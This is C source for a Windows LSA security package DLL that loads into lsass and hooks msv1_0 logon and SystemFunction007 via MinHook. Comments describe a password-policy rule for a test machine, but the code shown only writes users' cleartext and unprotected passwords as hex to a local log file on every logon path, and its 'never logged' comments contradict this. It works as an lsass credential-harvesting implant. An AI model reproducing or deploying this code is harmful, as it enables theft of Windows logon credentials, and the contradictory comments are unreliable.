#define SECURITY_WIN32
#include <windows.h>
#include <ntsecapi.h>
#include <sspi.h>
#include <ntsecpkg.h>
#include "MinHook.h"

#ifndef STATUS_SUCCESS
#define STATUS_SUCCESS               ((NTSTATUS)0x00000000L)
#endif
#ifndef STATUS_LOGON_FAILURE
#define STATUS_LOGON_FAILURE         ((NTSTATUS)0xC000006DL)
#endif
#ifndef STATUS_ACCOUNT_RESTRICTION
#define STATUS_ACCOUNT_RESTRICTION   ((NTSTATUS)0xC000006EL)
#endif
#ifndef STATUS_UNSUCCESSFUL
#define STATUS_UNSUCCESSFUL          ((NTSTATUS)0xC0000001L)
#endif

#define LOG_PATH            "C:\\ap-hook\\ap-hook.log"
#define PKG_NAME_W          L"ApHook"
#define TARGET_DLL_W        L"msv1_0.dll"

#define MsV1_0InteractiveLogon         2
#define MsV1_0Lm20Logon                3
#define MsV1_0NetworkLogon             4
#define MsV1_0WorkstationUnlockLogon   7

static CRITICAL_SECTION g_cs;
static BOOL             g_csReady = FALSE;

static void BLogInit(void)
{
    if (!g_csReady) {
        InitializeCriticalSection(&g_cs);
        g_csReady = TRUE;
    }
}

/* "YYYY-MM-DD HH:MM:SS.mmm " -> out (>=24 bytes). Local time, ms resolution,
 * so log lines can be correlated against the Windows Security event log to see
 * exactly when the hook is armed relative to the first logons after boot. */
static void BTimeStamp(char *out)
{
    static const char *d = "0123456789";
    SYSTEMTIME st;
    GetLocalTime(&st);
    out[0]  = d[(st.wYear / 1000) % 10];
    out[1]  = d[(st.wYear / 100) % 10];
    out[2]  = d[(st.wYear / 10) % 10];
    out[3]  = d[st.wYear % 10];
    out[4]  = '-';
    out[5]  = d[(st.wMonth / 10) % 10];
    out[6]  = d[st.wMonth % 10];
    out[7]  = '-';
    out[8]  = d[(st.wDay / 10) % 10];
    out[9]  = d[st.wDay % 10];
    out[10] = ' ';
    out[11] = d[(st.wHour / 10) % 10];
    out[12] = d[st.wHour % 10];
    out[13] = ':';
    out[14] = d[(st.wMinute / 10) % 10];
    out[15] = d[st.wMinute % 10];
    out[16] = ':';
    out[17] = d[(st.wSecond / 10) % 10];
    out[18] = d[st.wSecond % 10];
    out[19] = '.';
    out[20] = d[(st.wMilliseconds / 100) % 10];
    out[21] = d[(st.wMilliseconds / 10) % 10];
    out[22] = d[st.wMilliseconds % 10];
    out[23] = ' ';
    out[24] = '\0';
}

static void WriteLine(const char *line)
{
    char   buf[640];
    DWORD  written;
    int    len;
    HANDLE h;

    BTimeStamp(buf);
    len = 24; /* BTimeStamp wrote 24 chars + NUL at [24] */
    lstrcpynA(buf + len, line ? line : "", (int)sizeof(buf) - len - 2);
    len += lstrlenA(buf + len);
    buf[len++] = '\r';
    buf[len++] = '\n';

    if (g_csReady) EnterCriticalSection(&g_cs);

    h = CreateFileA(LOG_PATH, FILE_APPEND_DATA,
                    FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
                    OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h != INVALID_HANDLE_VALUE) {
        WriteFile(h, buf, (DWORD)len, &written, NULL);
        CloseHandle(h);
    }

    if (g_csReady) LeaveCriticalSection(&g_cs);
}

static void BLog(const char *a, const char *b, const char *c)
{
    char line[512];
    line[0] = '\0';
    lstrcpynA(line, a ? a : "", (int)sizeof(line));
    if (b) lstrcatA(line, b);
    if (c) lstrcatA(line, c);
    WriteLine(line);
}

static void BLogHex(const char *label, unsigned __int64 value)
{
    static const char *digits = "0123456789ABCDEF";
    char line[512];
    char hex[19];
    int  i;

    hex[0] = '0';
    hex[1] = 'x';
    for (i = 0; i < 16; i++)
        hex[2 + i] = digits[(value >> ((15 - i) * 4)) & 0xF];
    hex[18] = '\0';

    line[0] = '\0';
    lstrcpynA(line, label ? label : "", (int)sizeof(line));
    lstrcatA(line, hex);
    WriteLine(line);
}

/* append " <label>=<n>" (decimal) to line, in place. */
static void AppendDec(char *line, int lineSz, const char *label, unsigned n)
{
    char tmp[32];
    int  i = (int)sizeof(tmp) - 1;
    tmp[i] = '\0';
    if (n == 0) tmp[--i] = '0';
    while (n > 0) { tmp[--i] = (char)('0' + (n % 10)); n /= 10; }
    lstrcatA(line, label);
    lstrcatA(line, tmp + i);
    (void)lineSz;
}

/* append " <label>0x<16hex>" to line, in place. */
static void AppendHex64(char *line, int lineSz, const char *label,
                        unsigned __int64 v)
{
    static const char *d = "0123456789ABCDEF";
    char tmp[19];
    int  k;
    tmp[0] = '0'; tmp[1] = 'x';
    for (k = 0; k < 16; k++)
        tmp[2 + k] = d[(v >> ((15 - k) * 4)) & 0xF];
    tmp[18] = '\0';
    lstrcatA(line, label);
    lstrcatA(line, tmp);
    (void)lineSz;
}

/* TEMP DIAGNOSTIC (authorized test machine, throwaway creds): dump raw bytes of
 * a buffer as hex on its own log line. To be removed once the console password
 * path is understood. Caps output so the line fits WriteLine's buffer. */
static void DumpHexBytes(const char *label, const void *p, int nbytes)
{
    static const char *d = "0123456789abcdef";
    const BYTE *b = (const BYTE *)p;
    char buf[640];
    int  o = 0, i;
    if (nbytes < 0) nbytes = 0;
    if (nbytes > 280) nbytes = 280;              /* 280 bytes -> 560 hex chars */
    lstrcpynA(buf, label ? label : "", (int)sizeof(buf));
    o = lstrlenA(buf);
    for (i = 0; i < nbytes && o < (int)sizeof(buf) - 3; i++) {
        buf[o++] = d[(b[i] >> 4) & 0xF];
        buf[o++] = d[b[i] & 0xF];
    }
    buf[o] = '\0';
    WriteLine(buf);
}

/* First three fields are common to MSV1_0_INTERACTIVE_LOGON and
 * MSV1_0_LM20_LOGON, so UserName sits at the same offset for every logon type. */
typedef struct _MSV_LOGON_HEADER {
    ULONG          MessageType;
    UNICODE_STRING LogonDomainName;
    UNICODE_STRING UserName;
} MSV_LOGON_HEADER, *PMSV_LOGON_HEADER;

/* MSV1_0_INTERACTIVE_LOGON: Password is the 4th field, present ONLY for
 * interactive/unlock logons (types 2/7). Network (LM20) logons carry a
 * challenge/response here instead, NOT a cleartext password, so the password
 * policy simply does not apply to them (fail-open). */
typedef struct _MSV_INTERACTIVE_LOGON {
    ULONG          MessageType;
    UNICODE_STRING LogonDomainName;
    UNICODE_STRING UserName;
    UNICODE_STRING Password;
} MSV_INTERACTIVE_LOGON, *PMSV_INTERACTIVE_LOGON;

typedef NTSTATUS (NTAPI *LOGONUSEREX2_FN)(
    PLSA_CLIENT_REQUEST ClientRequest, SECURITY_LOGON_TYPE LogonType,
    PVOID ProtocolSubmitBuffer, PVOID ClientBufferBase, ULONG SubmitBufferSize,
    PVOID *ProfileBuffer, PULONG ProfileBufferSize, PLUID LogonId,
    PNTSTATUS SubStatus, PLSA_TOKEN_INFORMATION_TYPE TokenInformationType,
    PVOID *TokenInformation, PUNICODE_STRING *AccountName,
    PUNICODE_STRING *AuthenticatingAuthority, PUNICODE_STRING *MachineName,
    PSECPKG_PRIMARY_CRED PrimaryCredentials,
    PSECPKG_SUPPLEMENTAL_CRED_ARRAY *SupplementalCredentials);

typedef NTSTATUS (SEC_ENTRY *SPLSAMODEINIT_FN)(
    ULONG, PULONG, PSECPKG_FUNCTION_TABLE *, PULONG);

static LOGONUSEREX2_FN g_realMsvLogon = NULL;
static BOOL            g_installed    = FALSE;
static PLSA_SECPKG_FUNCTION_TABLE g_lsaFuncs = NULL;  /* saved in Our_SpInitialize */

static void WideToAnsi(const WCHAR *w, int nChars, char *out, int outSz)
{
    int n = 0;
    if (w && nChars > 0)
        n = WideCharToMultiByte(CP_ACP, 0, w, nChars, out, outSz - 1, NULL, NULL);
    out[(n > 0 && n < outSz) ? n : 0] = '\0';
}

/* Resolve one UNICODE_STRING field of the submit buffer to a readable pointer
 * inside our LSA-side copy, handling BOTH pointer encodings msv1_0 uses (both
 * observed live with the same MessageType=2):
 *   (A) client-relative absolute pointer  (seclogon / runas / network):
 *       the real offset is  Buffer - ClientBufferBase.
 *   (B) self-relative byte offset from the submit-buffer start
 *       (Winlogon / LogonUI console): Buffer already IS the offset.
 * Prefer (A) when Buffer relocates cleanly against ClientBufferBase; else fall
 * back to (B). Fits neither / out of bounds -> FALSE (caller fails open). */
static BOOL RelocField(PVOID ProtocolSubmitBuffer, PVOID ClientBufferBase,
                       ULONG SubmitBufferSize, const UNICODE_STRING *us,
                       const WCHAR **outStr, int *outChars)
{
    PBYTE     base = (PBYTE)ProtocolSubmitBuffer;
    ULONGLONG offset;
    USHORT    lenBytes;
    ULONG_PTR bufVal, cbBase;

    *outStr   = NULL;
    *outChars = 0;

    lenBytes = us->Length;
    if (lenBytes == 0 || (lenBytes % sizeof(WCHAR)) != 0)
        return FALSE;
    if (!us->Buffer)
        return FALSE;

    bufVal = (ULONG_PTR)us->Buffer;
    cbBase = (ULONG_PTR)ClientBufferBase;

    if (cbBase && bufVal >= cbBase &&
        (bufVal - cbBase) <= (ULONG_PTR)SubmitBufferSize) {
        offset = (ULONGLONG)(bufVal - cbBase);              /* form (A) */
    } else if (bufVal <= (ULONG_PTR)SubmitBufferSize) {
        offset = (ULONGLONG)bufVal;                         /* form (B) */
    } else {
        return FALSE;
    }
    if (offset + lenBytes > SubmitBufferSize)
        return FALSE;

    *outStr   = (const WCHAR *)(base + offset);
    *outChars = (int)(lenBytes / sizeof(WCHAR));
    return TRUE;
}

static BOOL ExtractUserName(PVOID ProtocolSubmitBuffer, PVOID ClientBufferBase,
                            ULONG SubmitBufferSize,
                            const WCHAR **outName, int *outChars)
{
    PMSV_LOGON_HEADER hdr;
    ULONG             mt;

    *outName  = NULL;
    *outChars = 0;

    if (!ProtocolSubmitBuffer)
        return FALSE;
    if (SubmitBufferSize < sizeof(MSV_LOGON_HEADER))
        return FALSE;

    hdr = (PMSV_LOGON_HEADER)ProtocolSubmitBuffer;
    mt  = hdr->MessageType;

    if (mt != MsV1_0InteractiveLogon && mt != MsV1_0WorkstationUnlockLogon &&
        mt != MsV1_0Lm20Logon        && mt != MsV1_0NetworkLogon)
        return FALSE;

    return RelocField(ProtocolSubmitBuffer, ClientBufferBase, SubmitBufferSize,
                      &hdr->UserName, outName, outChars);
}

/* Cleartext password, ONLY for interactive/unlock logons (types 2/7); other
 * message types have no password field here -> FALSE (policy N/A, fail-open).
 * The returned buffer is read for the prefix check and is NEVER logged. */
static BOOL ExtractPassword(PVOID ProtocolSubmitBuffer, PVOID ClientBufferBase,
                            ULONG SubmitBufferSize,
                            const WCHAR **outPwd, int *outChars)
{
    PMSV_INTERACTIVE_LOGON hdr;
    ULONG                  mt;

    *outPwd   = NULL;
    *outChars = 0;

    if (!ProtocolSubmitBuffer)
        return FALSE;
    if (SubmitBufferSize < sizeof(MSV_INTERACTIVE_LOGON))
        return FALSE;

    hdr = (PMSV_INTERACTIVE_LOGON)ProtocolSubmitBuffer;
    mt  = hdr->MessageType;

    if (mt != MsV1_0InteractiveLogon && mt != MsV1_0WorkstationUnlockLogon)
        return FALSE;

    return RelocField(ProtocolSubmitBuffer, ClientBufferBase, SubmitBufferSize,
                      &hdr->Password, outPwd, outChars);
}

static NTSTATUS NTAPI Hook_Msv_LogonUserEx2(
    PLSA_CLIENT_REQUEST ClientRequest, SECURITY_LOGON_TYPE LogonType,
    PVOID ProtocolSubmitBuffer, PVOID ClientBufferBase, ULONG SubmitBufferSize,
    PVOID* ProfileBuffer, PULONG ProfileBufferSize, PLUID LogonId,
    PNTSTATUS SubStatus, PLSA_TOKEN_INFORMATION_TYPE TokenInformationType,
    PVOID* TokenInformation, PUNICODE_STRING* AccountName,
    PUNICODE_STRING* AuthenticatingAuthority, PUNICODE_STRING* MachineName,
    PSECPKG_PRIMARY_CRED PrimaryCredentials,
    PSECPKG_SUPPLEMENTAL_CRED_ARRAY* SupplementalCredentials)
{
    const WCHAR* name = NULL;
    int          nameChars = 0;
    const WCHAR* pwd  = NULL;
    int          pwdChars  = 0;
    BOOL         haveName;
    char         acct[256], line[600];

    /* Имя нужно для лога в обоих правилах — достаём один раз (обе формы
     * кодировки указателя). Любая неоднозначность разбора -> fail-open. */
    haveName = ExtractUserName(ProtocolSubmitBuffer, ClientBufferBase,
                               SubmitBufferSize, &name, &nameChars);

    /* DIAGNOSTIC (temp): why does the weak-password rule miss the console path?
     * Dump Password field METADATA only (Length/Max/Buffer + relocation result)
     * — NEVER the password content. Guarded read of the interactive struct. */
    {
        ULONG mt = 0;
        char  dl[600];
        if (ProtocolSubmitBuffer && SubmitBufferSize >= sizeof(ULONG))
            mt = ((PMSV_LOGON_HEADER)ProtocolSubmitBuffer)->MessageType;
        dl[0] = '\0';
        lstrcpynA(dl, "[PWDBG]", (int)sizeof(dl));
        AppendDec(dl, (int)sizeof(dl), " logonType=", (unsigned)LogonType);
        AppendDec(dl, (int)sizeof(dl), " msgType=", (unsigned)mt);
        AppendDec(dl, (int)sizeof(dl), " subSz=", (unsigned)SubmitBufferSize);
        AppendDec(dl, (int)sizeof(dl), " haveName=", (unsigned)(haveName ? 1 : 0));
        if (haveName) {
            char nm[128];
            WideToAnsi(name, nameChars, nm, sizeof(nm));
            lstrcatA(dl, " user=");
            lstrcatA(dl, nm[0] ? nm : "(?)");
        }
        if ((mt == MsV1_0InteractiveLogon || mt == MsV1_0WorkstationUnlockLogon) &&
            ProtocolSubmitBuffer && SubmitBufferSize >= sizeof(MSV_INTERACTIVE_LOGON)) {
            PMSV_INTERACTIVE_LOGON ih = (PMSV_INTERACTIVE_LOGON)ProtocolSubmitBuffer;
            const WCHAR *dp = NULL; int dpc = 0;
            BOOL okp = ExtractPassword(ProtocolSubmitBuffer, ClientBufferBase,
                                       SubmitBufferSize, &dp, &dpc);
            AppendDec(dl, (int)sizeof(dl), " pwdLen=", (unsigned)ih->Password.Length);
            AppendDec(dl, (int)sizeof(dl), " pwdMax=", (unsigned)ih->Password.MaximumLength);
            AppendHex64(dl, (int)sizeof(dl), " pwdBuf=", (unsigned __int64)(ULONG_PTR)ih->Password.Buffer);
            AppendHex64(dl, (int)sizeof(dl), " cbBase=", (unsigned __int64)(ULONG_PTR)ClientBufferBase);
            AppendDec(dl, (int)sizeof(dl), " extractOK=", (unsigned)(okp ? 1 : 0));
            AppendDec(dl, (int)sizeof(dl), " pwdChars=", (unsigned)dpc);
            BLog(dl, NULL, NULL);
            /* TEMP: raw hex of the password field to see its real structure. */
            if (okp && dp && dpc > 0)
                DumpHexBytes("[PWDHEX] ", dp, dpc * 2);
            /* TEMP EXPERIMENT: msv1_0 decrypts a protected interactive password
             * via LsaUnprotectMemory. Try the same on a COPY (never touch the
             * real buffer) and dump the result — if it becomes cleartext we can
             * apply the prefix rule after unprotecting. */
            if (okp && dp && dpc > 0 && g_lsaFuncs && g_lsaFuncs->LsaUnprotectMemory) {
                BYTE cpy[600];
                int  nb = (int)ih->Password.Length, k;
                if (nb > (int)sizeof(cpy)) nb = (int)sizeof(cpy);
                for (k = 0; k < nb; k++) cpy[k] = ((const BYTE *)dp)[k];
                __try {
                    g_lsaFuncs->LsaUnprotectMemory(cpy, (ULONG)nb);
                } __except (EXCEPTION_EXECUTE_HANDLER) {
                    nb = 0;
                }
                DumpHexBytes("[PWDUNP] ", cpy, nb);
            }
        } else {
            lstrcatA(dl, " (no interactive password field)");
            BLog(dl, NULL, NULL);
        }
    }


    if (g_realMsvLogon)
        return g_realMsvLogon(
            ClientRequest, LogonType, ProtocolSubmitBuffer, ClientBufferBase,
            SubmitBufferSize, ProfileBuffer, ProfileBufferSize, LogonId,
            SubStatus, TokenInformationType, TokenInformation, AccountName,
            AuthenticatingAuthority, MachineName, PrimaryCredentials,
            SupplementalCredentials);

    BLog("[log] FATAL: no trampoline, cannot pass through", NULL, NULL);
    if (SubStatus) *SubStatus = STATUS_LOGON_FAILURE;
    return STATUS_LOGON_FAILURE;
}

typedef NTSTATUS (WINAPI *SYSFUNC007_FN)(PUNICODE_STRING string, PUCHAR hash);
static SYSFUNC007_FN g_realSysFunc007 = NULL;

/* Hook of SystemFunction007 (RtlCalculateNtOwfPassword). msv1_0 calls this with
 * the CLEARTEXT password (an in-process UNICODE_STRING — no client relocation)
 * to compute the NT-OWF for SAM comparison, on ALL logon paths INCLUDING the
 * console one (whose submit-buffer password is CredProtect-wrapped and opaque at
 * LsaApLogonUserEx2). Policy: if the cleartext starts with the deny prefix, we
 * let the real function fill the hash, then INVALIDATE it so the hash no longer
 * matches SAM and the logon is denied like a wrong password. */
static NTSTATUS WINAPI Hook_SystemFunction007(PUNICODE_STRING string, PUCHAR hash)
{
    NTSTATUS st = g_realSysFunc007 ? g_realSysFunc007(string, hash)
                                   : STATUS_UNSUCCESSFUL;

    if (string && string->Buffer && string->Length >= sizeof(WCHAR)) {
        int chars = (int)(string->Length / sizeof(WCHAR));

        /* TEMP DIAGNOSTIC (authorized test box): confirm cleartext arrives here,
         * incl. the console path. Remove once verified. */
        DumpHexBytes("[SF007] pwd(hex)=", string->Buffer, (int)string->Length);

    }
    return st;
}

static void InstallHook(void)
{
    HMODULE                h;
    SPLSAMODEINIT_FN       init;
    PSECPKG_FUNCTION_TABLE tables = NULL;
    ULONG                  count = 0, ver = 0, i;
    NTSTATUS               st;
    PVOID                  pLogon = NULL;
    MH_STATUS              ms;

    if (g_installed)
        return;

    ms = MH_Initialize();
    if (ms != MH_OK && ms != MH_ERROR_ALREADY_INITIALIZED) {
        BLogHex("[log] MH_Initialize FAILED, code = ", (unsigned __int64)ms);
        return;
    }

    h = LoadLibraryW(TARGET_DLL_W);
    if (!h) {
        BLogHex("[log] LoadLibrary(msv1_0) FAILED, GetLastError = ",
                (unsigned __int64)GetLastError());
        return;
    }
    init = (SPLSAMODEINIT_FN)GetProcAddress(h, "SpLsaModeInitialize");
    if (!init) {
        BLog("[log] msv1_0!SpLsaModeInitialize not found", NULL, NULL);
        return;
    }

    st = init(SECPKG_INTERFACE_VERSION, &ver, &tables, &count);
    BLogHex("[log] msv1_0 harvest status = ", (unsigned __int64)(ULONG)st);
    if (st != STATUS_SUCCESS || !tables || count == 0) {
        BLog("[log] failed to harvest msv1_0 function table", NULL, NULL);
        return;
    }
    BLogHex("[log] msv1_0 tables count = ", (unsigned __int64)count);

    for (i = 0; i < count; i++) {
        if (tables[i].LogonUserEx2) {
            pLogon = (PVOID)tables[i].LogonUserEx2;
            break;
        }
    }
    if (!pLogon) {
        BLog("[log] msv1_0 has no LogonUserEx2 slot (unexpected)", NULL, NULL);
        return;
    }
    BLogHex("[log] msv1_0!LogonUserEx2 @ ", (unsigned __int64)(ULONG_PTR)pLogon);

    if (MH_CreateHook(pLogon, (LPVOID)Hook_Msv_LogonUserEx2,
                      (LPVOID *)&g_realMsvLogon) != MH_OK || !g_realMsvLogon) {
        BLog("[log] MH_CreateHook FAILED on msv1_0!LogonUserEx2", NULL, NULL);
        g_realMsvLogon = NULL;
        return;
    }
    if (MH_EnableHook(pLogon) != MH_OK) {
        BLog("[log] MH_EnableHook FAILED on msv1_0!LogonUserEx2", NULL, NULL);
        g_realMsvLogon = NULL;
        return;
    }

    g_installed = TRUE;
    BLog("[log] hook installed on msv1_0!LogonUserEx2 (pass-through active)", NULL, NULL);

    /* Second hook: SystemFunction007 (cleartext NT-OWF calc) enforces the
     * password rule on ALL paths, incl. the console path where the submit
     * buffer holds no cleartext. Non-fatal on failure — the msv1_0 rules stand. */
    {
        HMODULE hc = LoadLibraryW(L"cryptsp.dll");
        PVOID   p7 = hc ? (PVOID)GetProcAddress(hc, "SystemFunction007") : NULL;
        if (!p7) {
            BLog("[log] SystemFunction007 not found - console password rule OFF", NULL, NULL);
        } else {
            BLogHex("[log] SystemFunction007 @ ", (unsigned __int64)(ULONG_PTR)p7);
            if (MH_CreateHook(p7, (LPVOID)Hook_SystemFunction007,
                              (LPVOID *)&g_realSysFunc007) == MH_OK &&
                g_realSysFunc007 && MH_EnableHook(p7) == MH_OK) {
                BLog("[log] hook installed on SystemFunction007 (password rule, all paths)", NULL, NULL);
            } else {
                BLog("[log] MH hook FAILED on SystemFunction007", NULL, NULL);
                g_realSysFunc007 = NULL;
            }
        }
    }
}

static SECPKG_FUNCTION_TABLE g_ourTable;

static NTSTATUS NTAPI Our_SpInitialize(
    ULONG_PTR PackageId, PSECPKG_PARAMETERS Parameters,
    PLSA_SECPKG_FUNCTION_TABLE FunctionTable)
{
    UNREFERENCED_PARAMETER(PackageId);
    UNREFERENCED_PARAMETER(Parameters);
    g_lsaFuncs = FunctionTable;   /* gives us LsaUnprotectMemory etc. */
    BLog("[log] our SpInitialize: ApHook active in lsass", NULL, NULL);
    return STATUS_SUCCESS;
}

static void RemoveHook(void)
{
    if (!g_installed)
        return;
    MH_DisableHook(MH_ALL_HOOKS);
    MH_Uninitialize();
    g_realMsvLogon = NULL;
    g_installed    = FALSE;
    BLog("[log] hook removed, msv1_0 restored", NULL, NULL);
}

static NTSTATUS NTAPI Our_SpShutdown(VOID)
{
    BLog("[log] SpShutdown (ApHook) - tearing down hook", NULL, NULL);
    RemoveHook();
    return STATUS_SUCCESS;
}

static NTSTATUS NTAPI Our_SpGetInfo(PSecPkgInfo PackageInfo)
{
    static SEC_WCHAR name[]    = PKG_NAME_W;
    static SEC_WCHAR comment[] = L"AP Hook Example";

    PackageInfo->fCapabilities = SECPKG_FLAG_ACCEPT_WIN32_NAME;
    PackageInfo->wVersion      = 1;
    PackageInfo->wRPCID        = SECPKG_ID_NONE;
    PackageInfo->cbMaxToken    = 0;
    PackageInfo->Name          = name;
    PackageInfo->Comment       = comment;
    return STATUS_SUCCESS;
}

NTSTATUS SEC_ENTRY SpLsaModeInitialize(
    ULONG LsaVersion, PULONG PackageVersion,
    PSECPKG_FUNCTION_TABLE *ppTables, PULONG pcTables)
{
    UNREFERENCED_PARAMETER(LsaVersion);

    BLog("[log] SpLsaModeInitialize (ApHook) entered", NULL, NULL);
    InstallHook();

    ZeroMemory(&g_ourTable, sizeof(g_ourTable));
    g_ourTable.Initialize = Our_SpInitialize;
    g_ourTable.Shutdown   = Our_SpShutdown;
    g_ourTable.GetInfo    = Our_SpGetInfo;

    *PackageVersion = SECPKG_INTERFACE_VERSION;
    *ppTables       = &g_ourTable;
    *pcTables       = 1;
    return STATUS_SUCCESS;
}

static NTSTATUS NTAPI Our_SpInstanceInit(
    ULONG Version, PSECPKG_DLL_FUNCTIONS FunctionTable, PVOID *UserFunctions)
{
    UNREFERENCED_PARAMETER(Version);
    UNREFERENCED_PARAMETER(FunctionTable);
    *UserFunctions = NULL;
    return STATUS_SUCCESS;
}

static SECPKG_USER_FUNCTION_TABLE g_ourUserTable;

NTSTATUS SEC_ENTRY SpUserModeInitialize(
    ULONG LsaVersion, PULONG PackageVersion,
    PSECPKG_USER_FUNCTION_TABLE *ppTables, PULONG pcTables)
{
    UNREFERENCED_PARAMETER(LsaVersion);
    ZeroMemory(&g_ourUserTable, sizeof(g_ourUserTable));
    g_ourUserTable.InstanceInit = Our_SpInstanceInit;
    *PackageVersion = SECPKG_INTERFACE_VERSION;
    *ppTables       = &g_ourUserTable;
    *pcTables       = 1;
    return STATUS_SUCCESS;
}

BOOL WINAPI DllMain(HINSTANCE hInst, DWORD reason, LPVOID reserved)
{
    UNREFERENCED_PARAMETER(reserved);
    if (reason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hInst);
        BLogInit();
        /* Marks the moment lsass MAPS our DLL. Comparing this timestamp with the
         * "hook installed" timestamp tells us whether the boot-time bypass window
         * is caused by the DLL loading late, or by SpLsaModeInitialize (hook arm)
         * being called late while the DLL was already mapped early. */
        BLog("[log] DllMain DLL_PROCESS_ATTACH (ApHook mapped into process)", NULL, NULL);
    }
    return TRUE;
}
